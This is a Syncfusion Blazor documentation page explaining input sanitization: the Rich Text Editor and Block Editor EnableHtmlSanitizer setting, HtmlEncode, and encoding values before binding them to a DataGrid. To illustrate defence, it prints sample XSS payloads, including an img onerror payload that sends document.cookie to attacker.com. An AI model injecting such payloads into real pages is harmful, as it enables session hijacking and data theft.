---
layout: post
title: Input Sanitization with Syncfusion Blazor Components
description: Discover effective techniques for securely sanitizing user input in Syncfusion Blazor components to protect your application from unsafe data.
platform: Blazor
control: Common
documentation: ug
---

# Input Sanitization in Syncfusion Blazor Components

## Overview

Input sanitization is a critical security practice in Syncfusion Blazor applications that handle user-generated content. Syncfusion Blazor components include built-in HTML sanitization (enabled by default in most cases) to safely process and render potentially untrusted content. This guide explains how these features work, focusing especially on the **Rich Text Editor**(using `EnableHtmlSanitizer` property), and provides guidance for other components such as **DataGrid**.

## What is Input Sanitization

Input sanitization is the process of parsing and filtering HTML content from untrusted sources to remove or escape unsafe tags, attributes, inline scripts, event handlers, and dangerous URLs, while preserving legitimate formatting and safe markup.

## Why Input Sanitization is important

Blazor applications often accept text input, file uploads, dialog content, and query parameters. Users may intentionally or accidentally submit HTML or script content that may execute unexpectedly when rendered as HTML.

If untrusted content is not sanitized, it may:

* Execute malicious JavaScript
* Alter UI layout or behavior
* Leak sensitive data
* Inject unauthorized markup into components

Sanitizing user input ensures that only safe and expected values are stored or displayed.

Example:

```
Unsafe input:
<script>alert('XSS')</script>

Sanitized output:
(alert removed)
```

## Types of Attacks

| Attack | Description | Prevention |
|--------|-------------|------------|
| **Cross-Site Scripting (XSS)** | Attackers insert JavaScript into user-generated content. If rendered as HTML, the script executes in the user's browser. Example: `<script>alert('XSS');</script>` | Enable built-in sanitizer (EnableHtmlSanitizer="true", default in RTE); use HtmlEncode for plain-text inputs.|
| **HTML Injection** | Attackers insert unauthorized markup that modifies page appearance or user experience. Example: `<iframe src="phish-site.com"></iframe>` (embeds phishing form for credential theft). | Sanitizer removes unsafe tags/attributes; avoid rendering raw HTML from untrusted sources. |

Both attacks rely on causing the application to interpret malicious markup as legitimate HTML. Sanitization removes unsafe tags, attributes, or scripts to prevent such vulnerabilities.

## Built-In Sanitization Features

Several Syncfusion Blazor components include HTML sanitization capabilities to prevent harmful script or markup from being processed. Components that accept or render HTML content such as the Rich Text Editor have built-in `EnableHtmlSanitizer` property to remove unsafe elements before rendering.

When this property is enabled, the Rich Text Editor component automatically filters out unsafe markup before rendering the content. 

In the example shown, the sanitizer removes embedded scripts and event based attacks to prevent malicious code execution. It strips `<script>` tags, inline event handlers, JavaScript URLs, and dangerous elements like `<iframe>` or `<object>` to ensure that only safe HTML is displayed.

```
<script>alert('XSS attack!')</script>
<img src="x" onerror="fetch('https://attacker.com/steal?cookie='+document.cookie)">

Sanitized output:

(alert script removed)
<img src="x">
```

### Rich Text Editor (RTE)

The Rich Text Editor allows users to input and render HTML content. To prevent unsafe markup from being inserted or displayed, enable the built-in sanitizer using the `EnableHtmlSanitizer` property.

{% tabs %}
{% highlight razor %}

@using Syncfusion.Blazor.RichTextEditor

<SfRichTextEditor EnableHtmlSanitizer="true">
</SfRichTextEditor>

{% endhighlight %}
{% endtabs %}

When enabled the `EnableHtmlSanitizer` property, automatically removes unsafe tags and attributes such as `<script>` tags, event attributes (such as onload, onclick), and other unsafe content before rendering it. This ensures only clean and safe HTML is allowed in the editor.

To disable the built-in sanitizer (not recommended for untrusted content), set the property to `false`:

{% highlight razor %}

@using Syncfusion.Blazor.RichTextEditor

<SfRichTextEditor EnableHtmlSanitizer="false">
</SfRichTextEditor>

{% endhighlight %}

Disabling the sanitizer allows raw HTML to be accepted and rendered; ensure you apply server-side validation or other sanitization when disabling. 

### Block Editor

The Block Editor allows users to create structured content such as paragraphs, headings, lists, quotes, images, and links. Since user-generated content may include HTML-like input or potentially unsafe markup, enable the built-in sanitizer using the `EnableHtmlSanitizer` property to ensure only safe content is rendered.

{% tabs %}
{% highlight razor %}

@using Syncfusion.Blazor.BlockEditor

<sfblockeditor enablehtmlsanitizer="true">
</sfblockeditor>

{% endhighlight %}
{% endtabs %}

When the EnableHtmlSanitizer property is enabled, the Block Editor automatically removes unsafe tags and attributes such as `<script>` tags, event attributes (like onload, onclick), javascript: URLs, and other harmful markup before rendering content. This ensures that only clean and trusted HTML remains in the editor output.

To disable the built-in sanitizer (not recommended for untrusted input), set the property to false:

{% tabs %}
{% highlight razor %}

@using Syncfusion.Blazor.BlockEditor

<sfblockeditor enablehtmlsanitizer="false">
</sfblockeditor>

{% endhighlight %}
{% endtabs %}

Disabling sanitization allows raw HTML to be inserted and rendered by the Block Editor. 

## How to Sanitize Input in Blazor

When you only need to display plain text (not HTML), the safest approach is to HTML encode user input. Encoding converts characters like <, >, and & into harmless text representations so the browser will not interpret them as HTML or scripts. This ensures that even if the user enters malicious markup, it is displayed as text, not executed.

```
@code {
    string userInput = "<script>alert('XSS')</script> Hello!";
    string safeText = System.Net.WebUtility.HtmlEncode(userInput);
}

Output:

<script>alert('XSS')</script> Hello! //treated as text, not executed
```

Displaying the encoded text ensures it is treated as plain text.

## Component-Specific Guidelines

### DataGrid

The DataGrid can render HTML when using templates or when column values include markup. User provided values should be sanitized before being added to the data source. 

The following example demonstrates sanitizing text before binding it to the Grid:

{% tabs %}
{% highlight razor %}

@page "/"

@using Syncfusion.Blazor.Buttons
@using Syncfusion.Blazor.Grids
@using Syncfusion.Blazor.Inputs


<SfTextBox @bind-Value="UserText" Placeholder="Enter text"></SfTextBox>

<SfButton CssClass="e-primary" OnClick="ProcessInput">
    Submit
</SfButton>

<SfGrid @ref="UserGrid" DataSource="Items" AllowPaging="true">
    <GridColumns>
        <GridColumn Field="Content" HeaderText="User Content" Width="200"></GridColumn>
    </GridColumns>
</SfGrid>

@code {
    public string UserText { get; set; } = string.Empty;

    public List<ItemRecord> Items { get; set; } = new();

    private SfGrid<ItemRecord> UserGrid;

    private void ProcessInput()
    {
        var cleaned = System.Net.WebUtility.HtmlEncode(UserText);
        Items.Add(new ItemRecord { Content = cleaned });
        Items = Items.ToList();
        StateHasChanged();
    }

    public class ItemRecord
    {
        public string Content { get; set; }
    }
}

{% endhighlight %}
{% endtabs %}

The encoded value ensures the Grid displays safe text without interpreting any malicious input.

{% previewsample "https://blazorplayground.syncfusion.com/embed/VXrxDAitJvkRyhWu?appbar=false&editor=false&result=true&errorlist=false&theme=bootstrap5" %}

## See Also

* [Paste Clean-up in Blazor Rich Text Editor](https://blazor.syncfusion.com/documentation/rich-text-editor/paste-cleanup)
* [Content Security Policy (CSP)](https://blazor.syncfusion.com/documentation/common/content-security-policy)
* [Paste Clean-up in Blazor Blcok Editor](https://sfblazor.azurewebsites.net/staging/documentation/block-editor/paste-cleanup)
